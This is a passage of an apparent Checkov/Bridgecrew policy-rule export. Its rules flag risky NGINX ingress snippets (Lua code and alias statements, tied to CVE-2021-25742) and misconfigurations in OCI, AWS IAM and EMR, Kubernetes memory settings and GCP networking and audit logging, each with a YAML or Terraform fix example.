<p>Allowing custom snippet annotations in ingress-nginx enables a user, who can create or update ingress objects, to obtain all secrets in the cluster. To still allow users leveraging the snippet feature it is recommend to remove any usage of LUA code.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25742" target="_self">CVE-2021-25742</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: app-ingress
  annotations:
    nginx.ingress.kubernetes.io/server-snippet: |
-     lua_package_path  "/etc/nginx/lua/?.lua;;";
      location / {
        return 200 'OK';
      }
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  - http:    
    paths:      
      - path: /exp        
        pathType: Prefix        
        backend:          
          service:            
            name: some-service            
            port:              
              number: 1234
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-lua-code-execution' target='_blank'> https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-lua-code-execution</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-lua-code-execution' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_154</key>
    <name>Prevent NGINX Ingress annotation snippets which contain alias statements</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="nginx-ingress-annotation-snippets-contain-alias-statements"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-nginx-ingress-annotation-snippets-contain-alias-statements"></div>NGINX Ingress annotation snippets contain alias statements</div><a aria-label="Skip link to NGINX Ingress annotation snippets contain alias statements" class="heading-anchor-icon fa fa-anchor" href="#nginx-ingress-annotation-snippets-contain-alias-statements"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Allowing custom snippet annotations in ingress-nginx enables a user, who can create or update ingress objects, to obtain all secrets in the cluster. To still allow users leveraging the snippet feature it is recommend to remove any usage of alias.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25742" target="_self">CVE-2021-25742</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  namespace: developer
  annotations:
    kubernetes.io/ingress.class: nginx
    nginx.ingress.kubernetes.io/rewrite-target: /$2
    nginx.ingress.kubernetes.io/server-snippet: |
      location ^~ "/test" {
        default_type 'text/plain';
-       alias /var/run;
      }
spec:
  rules:
  - http:
      paths:
        - path: /test
          pathType: Prefix
          backend:
            service:
              name: web
              port:
                number: 8080
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-alias-statements' target='_blank'> https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-alias-statements</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-alias-statements' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_2</key>
    <name>Ensure OCI Block Storage Block Volume has backup enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-block-storage-block-volume-has-backup-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-block-storage-block-volume-has-backup-is-disabled"></div>OCI Block Storage Block Volume has backup is disabled</div><a aria-label="Skip link to OCI Block Storage Block Volume has backup is disabled" class="heading-anchor-icon fa fa-anchor" href="#oci-block-storage-block-volume-has-backup-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Block Storage Volumes that are do not have backup enabled. It is recommended to have block volume backup policies on each block volume that the block volume can be restored during data loss events.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click on Edit button</li>
<li>Select the Backup Policy from the Backup Policies section as appropriate</li>
<li>Click Save Changes</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_volum</li>
<li><strong>Arguments</strong>: backup_policy_id </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_volume" "pass" {
  #Required
  compartment_id = var.compartment_id

  #Optional
  availability_domain = var.volume_availability_domain
  backup_policy_id    = data.oci_core_volume_backup_policies.test_volume_backup_policies.volume_backup_policies.0.id
  block_volume_replicas {
    #Required
    availability_domain = var.volume_block_volume_replicas_availability_domain

....
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-block-storage-block-volume-has-backup-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-block-storage-block-volume-has-backup-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-block-storage-block-volume-has-backup-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_14</key>
    <name>Ensure IAM groups include at least one IAM user</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-groups-do-not-include-at-least-one-iam-user"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-groups-do-not-include-at-least-one-iam-user"></div>IAM groups do not include at least one IAM user</div><a aria-label="Skip link to IAM groups do not include at least one IAM user" class="heading-anchor-icon fa fa-anchor" href="#iam-groups-do-not-include-at-least-one-iam-user"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_group_membership, aws_iam_group, aws_iam_user</li>
<li><strong>Argument:</strong> <em>name</em> and <em>users</em> of aws_iam_group_membership</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_iam_group_membership" "ok_group" {
  name = "tf-testing-group-membership"

  users = [
    aws_iam_user.user_one.name,
    aws_iam_user.user_two.name,
  ]

  group = aws_iam_group.group.name
}

resource "aws_iam_group" "group" {
  name = "test-group"
}

resource "aws_iam_user" "user_one" {
  name = "test-user"
}

resource "aws_iam_user" "user_two" {
  name = "test-user-two"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-iam-groups-include-at-least-one-iam-user' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-iam-groups-include-at-least-one-iam-user</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-iam-groups-include-at-least-one-iam-user' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_12</key>
    <name>Ensure memory requests are set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="memory-requests-are-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-memory-requests-are-not-set"></div>Memory requests are not set</div><a aria-label="Skip link to Memory requests are not set" class="heading-anchor-icon fa fa-anchor" href="#memory-requests-are-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Memory resources can be defined using values from bytes to petabytes, it is common to use mebibytes. If you configure a memory request that is larger than the amount of memory on your nodes, the pod will never be scheduled. When specifying a memory request for a container, include the <strong>resources:requests</strong> field in the container&#8217;s resource manifest. To specify a memory limit, include <strong>resources:limits</strong>.</p>
<p>Setting memory requests enforces a memory limit for a container. A container is guaranteed to have as much memory as it requests, but is not allowed to use more memory than the limit set. This configuration may save resources and prevent an attack on an exploited container.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: resources:requests:memory (Optional)<br/>
Defines the memory request size for the container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    resources:
      requests:
+       memory: &lt;memory request&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_11' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_13</key>
    <name>Ensure memory limits are set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="memory-limits-are-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-memory-limits-are-not-set"></div>Memory limits are not set</div><a aria-label="Skip link to Memory limits are not set" class="heading-anchor-icon fa fa-anchor" href="#memory-limits-are-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The scheduler uses resource request information for containers in a pod to decide which node to place the pod on. The kubelet enforces the resource limits set, so that the running container is not allowed to use more resource than the limit set.</p>
<p>If a process in the container tries to consume more than the allowed amount of memory, the system kernel terminates the process that attempted the allocation, with an out of memory (OOM) error. With no limit set, kubectl allocates more and more memory to the container until it runs out.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: resources:limits:memory (Optional)<br/>
Defines the memory limit for the container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    resources:
      limits:
+       memory: &lt;memory limit&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_12' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_3</key>
    <name>Ensure there are only GCP-managed service account keys for each service account</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="there-are-not-only-gcp-managed-service-account-keys-for-each-service-account"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-there-are-not-only-gcp-managed-service-account-keys-for-each-service-account"></div>There are not only GCP-managed service account keys for each service account</div><a aria-label="Skip link to There are not only GCP-managed service account keys for each service account" class="heading-anchor-icon fa fa-anchor" href="#there-are-not-only-gcp-managed-service-account-keys-for-each-service-account"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Anyone who has access to the keys will be able to access resources through the service account. GCP-managed keys are used by Cloud Platform services such as App Engine and Compute Engine. These keys cannot be downloaded. Google will keep the keys and automatically rotate them on an approximately weekly basis. User-managed keys are created, downloadable, and managed by users. They expire 10 years from creation.</p>
<p>For user-managed keys, the user has to take ownership of key management activities which include:</p>
<ul>
<li>Key storage</li>
<li>Key distribution</li>
<li>Key revocation</li>
<li>Key rotation</li>
<li>Protecting the keys from unauthorized users</li>
<li>Key recovery<br/>
Even with key owner precautions, keys can be easily leaked by common development malpractices like checking keys into the source code or leaving them in the Downloads directory, or accidentally leaving them on support blogs/channels.<br/>
We recommended you prevent user-managed service account keys.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_service_account, google_service_account_key</li>
<li><strong>Argument:</strong> service_account_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_service_account" "account_ok" {
  account_id = "dev-foo-account"
}

resource "google_service_account_key" "ok_key" {
  service_account_id = google_service_account.account_ok.name
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-there-are-only-gcp-managed-service-account-keys-for-each-service-account' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-there-are-only-gcp-managed-service-account-keys-for-each-service-account</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-there-are-only-gcp-managed-service-account-keys-for-each-service-account' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_7</key>
    <name>Ensure Amazon EMR clusters' security groups are not open to the world</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-emr-clusters-security-groups-are-open-to-the-world"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-emr-clusters-security-groups-are-open-to-the-world"></div>Amazon EMR clusters' security groups are open to the world</div><a aria-label="Skip link to Amazon EMR clusters' security groups are open to the world" class="heading-anchor-icon fa fa-anchor" href="#amazon-emr-clusters-security-groups-are-open-to-the-world"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Least privilege, it's is best practice to limit any database access only to those groups or instances that require it. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_emr_cluster and aws_security_group</li>
<li><strong>Argument:</strong> ingress of aws_security_group</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_emr_cluster" "cluster_ok" {
  name          = "emr-test-arn"
  release_label = "emr-4.6.0"
  applications  = ["Spark"]

  ec2_attributes {
    emr_managed_master_security_group = aws_security_group.block_access_ok.id
    emr_managed_slave_security_group  = aws_security_group.block_access_ok.id
    instance_profile                  = "connected_to_aws_iam_instance_profile"
  }
}

resource "aws_security_group" "block_access_ok" {
  name        = "block_access"
  description = "Block all traffic"

  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.0.0.0/16"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.0.0.0/16"]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-amazon-emr-clusters-security-groups-are-not-open-to-the-world' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-amazon-emr-clusters-security-groups-are-not-open-to-the-world</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-amazon-emr-clusters-security-groups-are-not-open-to-the-world' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_2</key>
    <name>Ensure GCP project is not configured with legacy network</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-project-is-configured-with-legacy-network"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-project-is-configured-with-legacy-network"></div>GCP project is configured with legacy network</div><a aria-label="Skip link to GCP project is configured with legacy network" class="heading-anchor-icon fa fa-anchor" href="#gcp-project-is-configured-with-legacy-network"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In order to prevent use of legacy networks, a project should not have a legacy network configured.<br/>
Legacy networks have a single network IPv4 prefix range and a single gateway IP address for the whole network. The network is global in scope and spans all cloud regions. Subnetworks cannot be created in a legacy network and are unable to switch from legacy to auto or custom subnet networks. Legacy networks can have an impact for high network traffic projects and are subject to a single point of contention or failure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_project</li>
<li><strong>Argument:</strong> google_compute_network</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_project" "bad_project" {
  name       = "My Project"
  project_id = "bad"
  org_id     = "1234567"
}

resource "google_compute_network" "vpc_network_bad" {
  name = "vpc-legacy"
- auto_create_subnetworks = true
  project = google_project.bad_project.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-legacy-networks-do-not-exist-for-a-project' target='_blank'> https://docs.bridgecrew.io/docs/ensure-legacy-networks-do-not-exist-for-a-project</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-legacy-networks-do-not-exist-for-a-project' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_5</key>
    <name>Ensure GCP project audit logging is configured properly across all services and all users in a project</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-project-audit-logging-is-not-configured-properly-across-all-services-and-all-users-in-a-project"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-project-audit-logging-is-not-configured-properly-across-all-services-and-all-users-in-a-project"></div>GCP project audit logging is not configured properly across all services and all users in a project</div><a aria-label="Skip link to GCP project audit logging is not configured properly across all services and all users in a project" class="heading-anchor-icon fa fa-anchor" href="#gcp-project-audit-logging-is-not-configured-properly-across-all-services-and-all-users-in-a-project"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is recommended that Cloud Audit Logging is configured to track all admin activities and read, write access to user data.<br/>
Cloud Audit Logging maintains two audit logs for each project, folder, and organization: Admin Activity and Data Access.</p>
<ol>
<li>Admin Activity logs contain log entries for API calls or other administrative actions that modify the configuration or metadata of resources. Admin Activity audit logs are enabled for all services and cannot be configured.</li>
<li>Data Access audit logs record API calls that create, modify, or read user-provided data. These are disabled by default and should be enabled.<br/>
There are three kinds of Data Access audit log information:</li>
</ol>
<ul>
<li>Admin read: Records operations that read metadata or configuration information. Admin Activity audit logs record writes of metadata and configuration information that cannot be disabled.</li>
<li>Data read: Records operations that read user-provided data. o Data write: Records operations that write user-provided data.<br/>
It is recommended to have an effective default audit config configured in such a way that:</li>
</ul>
<ol>
<li>logtype is set to DATA_READ (to log user activity tracking) and DATA_WRITES (to log changes/tampering to user data).</li>
<li>audit config is enabled for all the services supported by the Data Access audit logs feature.</li>
<li>Logs should be captured for all users, i.e., there are no exempted users in any of the audit config sections. This will ensure overriding the audit config will not contradict the requirement.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_project</li>
<li><strong>Argument:</strong> google_project_iam_audit_config</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_project" "good_project" {
  name = "good"
  project_id = "123456"
}

resource "google_project" "bad_project" {
  name = "bad"
  project_id = "123456"
}

resource "google_project_iam_audit_config" "project_good_audit" {
  project = google_project.good_project.id
+ service = "allServices"
  audit_log_config {
    log_type = "ADMIN_READ"
  }
  audit_log_config {
    log_type = "DATA_READ"
  }
  audit_log_config {
    log_type = "DATA_WRITE"
  }
}

resource "google_project_iam_audit_config" "project_bad_audit" {
  project = google_project.bad_project.id
- service = "someService"
  audit_log_config {
    log_type = "ADMIN_READ"
  }
  audit_log_config {
    log_type = "DATA_READ"
-   exempted_members = [
-     "user:<a class="__cf_email__" data-cfemail="6903060c0b05060e0e1a2901081a01000a061b19470a0604" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
-   ]
  }
}
